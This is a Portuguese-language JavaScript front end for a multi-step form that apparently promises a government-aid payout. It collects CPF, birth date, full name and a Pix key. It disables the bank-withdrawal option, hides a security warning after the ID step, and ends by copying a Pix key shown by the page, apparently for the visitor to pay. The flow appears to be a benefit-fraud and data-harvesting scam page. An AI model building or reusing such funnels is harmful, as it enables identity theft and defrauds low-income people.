document.getElementById('dataNascimento').addEventListener('input', function(event) {
    const input = event.target;
    let value = input.value.replace(/\D/g, '');
    if (value.length > 2) value = value.slice(0, 2) + '-' + value.slice(2);
    if (value.length > 5) value = value.slice(0, 5) + '-' + value.slice(5);
    input.value = value;
});

document.getElementById('formEtapa0').addEventListener('submit', function(event) {
    event.preventDefault();
    const renda = document.getElementById('renda').value;
    const auxilio = document.getElementById('auxilio').value;
    if (renda && auxilio) {
        document.getElementById('etapa0').style.display = 'none';
        document.getElementById('etapa1').style.display = 'block';
    } else {
        alert("Por favor, responda a todas as perguntas.");
    }
});

document.getElementById('formEtapa1').addEventListener('submit', function(event) {
    event.preventDefault();
    const cpf = document.getElementById('cpf').value;
    const dataNascimento = document.getElementById('dataNascimento').value;
    if (cpf && dataNascimento) {
        document.getElementById('etapa1').style.display = 'none';
        document.getElementById('etapa2').style.display = 'block';
        document.getElementById('avisoSeguranca').style.display = 'none'; // Esconde aviso de segurança após a etapa 2
    } else {
        alert("Por favor, preencha todos os campos.");
    }
});

document.getElementById('receberValor').addEventListener('click', function() {
    document.getElementById('etapa2').style.display = 'none';
    document.getElementById('etapa3').style.display = 'block';
});

document.getElementById('retirarBanco').addEventListener('click', function() {
    // Sem mensagem, botão inativo
});

document.getElementById('receberPix').addEventListener('click', function() {
    document.getElementById('etapa3').style.display = 'none';
    document.getElementById('etapa4').style.display = 'block';
});

document.getElementById('formEtapa4').addEventListener('submit', function(event) {
    event.preventDefault();
    const tipoChavePix = document.getElementById('tipoChavePix').value;
    const chavePix = document.getElementById('chavePix').value;
    const nomeCompleto = document.getElementById('nomeCompleto').value;
    if (tipoChavePix && chavePix && nomeCompleto) {
        document.getElementById('etapa4').style.display = 'none';
        document.getElementById('etapa5').style.display = 'block';
        document.getElementById('chavePixDisplay').innerText = chavePix;
        document.getElementById('nomeCompletoDisplay').innerText = nomeCompleto;
    } else {
        alert("Por favor, preencha todos os campos.");
    }
});

function copiarChavePix() {
    const chavePix = document.getElementById('chavePixCopiar').innerText;
    const inputTemp = document.createElement('input');
    inputTemp.value = chavePix;
    document.body.appendChild(inputTemp);
    inputTemp.select();
    document.execCommand('copy');
    document.body.removeChild(inputTemp);
    alert("Chave Pix copiada para a área de transferência!");
}
